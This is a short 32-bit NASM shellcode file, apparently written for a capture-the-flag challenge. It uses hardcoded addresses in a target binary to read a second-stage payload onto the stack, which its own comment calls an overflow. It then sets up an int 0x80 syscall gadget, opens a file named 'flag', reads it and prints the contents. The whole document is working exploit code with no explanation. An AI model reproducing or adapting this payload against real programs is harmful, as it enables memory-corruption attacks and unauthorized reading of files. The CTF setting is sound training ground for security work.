BITS 32
	jmp next_
	add esp, 0x100
	jmp esp
next_:
	; print() test
	mov     dword [esp+4], 0x08048858 
	mov     dword [esp], 4 
	mov 	ebx, 0x08048110 
	call    ebx					; print_

	push 	esp
	pop 	ebx
	sub		ebx, 0x100
	
	push 	0x1000				; size recv
	push 	ebx					; buffer -> stack -> overflow again!
	push 	0					; stdin
	push 	1					; read number
	mov 	eax, 0x08048110		; enter_gate
	call	eax

	signature times 0x10 db 0x71
	
	sub 	esp, 0x100
	xor 	esi, esi
	xor 	edi, edi
	xor 	eax, eax
	xor 	ecx, ecx
	xor 	edx, edx
	xor 	ebx, ebx
	mov     dword [esp+0x80], 0x07000018 	;07000018  int     80h             ; LINUX -		
	
	;flag
	mov     dword [esp+0x60], 0x67616c66		
	mov     dword [esp+0x64], 0x00000000

	; open(flag)
	lea 	eax, [esp+0x60]
	mov     ebx, eax
	mov     ecx, 0x20000
	mov     eax, 5 ; 5       sys_open
	call 	dword [esp+0x80]           ; LINUX - sys_mp
	
	; read(fd, buffer, size)
	mov     dword [esp], eax			; fd
	lea     eax, [esp+0x100]
	mov     dword [esp+4], eax		; buffer
	mov     dword [esp+8], 0x100
	mov 	ebx, 0x080483EC
	call    ebx					; read_

	; print()
	lea     eax, [esp+0x100]
	mov     dword [esp], eax
	mov 	ebx, 0x0804837C 
	call    ebx					; print_
	
	